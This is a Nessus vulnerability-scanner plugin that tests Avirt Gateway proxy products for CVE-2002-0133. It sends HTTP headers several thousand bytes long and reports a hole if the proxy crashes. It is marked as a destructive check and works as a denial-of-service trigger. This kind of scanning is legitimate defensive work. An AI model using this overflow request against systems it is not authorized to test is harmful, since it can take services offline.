#
# (C) Tenable Network Security, Inc.
# *untested*
#
# Cf. RFC 1945 & RFC 2068
# 
# Vulnerable:
# Avirt SOHO v4.2
# Avirt Gateway v4.2
# Avirt Gateway Suite v4.2
# 
# References:
# Date:  Thu, 17 Jan 2002 20:23:28 +0100
# From: "Strumpf Noir Society" <vuln-dev@labs.secureance.com>
# To: bugtraq@securityfocus.com
# Subject: Avirt Proxy Buffer Overflow Vulnerabilities
# 


include("compat.inc");

if(description)
{
  script_id(11715);
  script_bugtraq_id(3904);
  script_osvdb_id(6804);
  script_cve_id("CVE-2002-0133");
  script_version ("$Revision: 1.16 $");
  script_name(english:"Avirt Multiple Product HTTP Proxy Overflow");
  script_summary(english:"Too long HTTP header kills the HTTP proxy server");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a suite of applications that are affected
by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a product from the Avirt Gateway Suite. The
version installed is affected by a buffer overflow vulnerability. 

It was possible to kill the HTTP proxy by sending a specially crafted
request with a too long header. An attacker could exploit this to
deny service to the affected application. It may also be possible to
exploit this to execute arbitrary code." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jan/224");
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/01/17");
 script_cvs_date("$Date: 2016/09/26 16:00:41 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english: "Web Servers");
  script_require_ports("Services/http_proxy", 8080);
  script_dependencie("find_service2.nasl", "http_version.nasl");
  exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_kb_item("Services/http_proxy");
if (!port) port = 8080;
if (! get_port_state(port)) exit(0, "Port "+port+" is closed.");
if (http_is_dead(port: port)) exit(1, "The web proxy on port "+port+" is dead.");

soc = open_sock_tcp(port);
if(! soc) exit(1, "TCP connection to port "+port+" failed.");

domain = get_kb_item("Settings/third_party_domain");
if(domain)
  test_host = string("www.", domain);
 else 
  test_host = "www";
   
headers = make_array(
"From",			strcat(crap(2048), "@", crap(2048), ".org"),
"If-Modified-Since",	strcat("Sat, 29 Oct 1994 19:43:31 ", crap(data: "GMT", length: 4096)),
"Referer",		strcat("http://", crap(4096), "/"),
# Many other HTTP/1.1 headers...
"If-Unmodified-Since",	strcat("Sat, 29 Oct 1994 19:43:31 ", crap(data: "GMT", length: 2048)) );
	

foreach h (keys(headers))
{
  rq = http_mk_proxy_request(scheme: 'http', method: 'GET', 
   # version: 10, # ??
   item: strcat("/", rand()), host: test_host, port: 80,
   add_headers: make_array(h, headers[h]));
  r = http_send_recv_req(port: port, req: rq, exit_on_fail: 0);
  if (isnull(r))
  {
    if (http_is_dead(port: port, retry: 3))
      security_hole(port);
    exit(0);
  }
}

if (http_is_dead(port: port, retry: 3)) {  security_hole(port); exit(0); }
exit(0, "The web proxy on port "+port+" is still alive.");
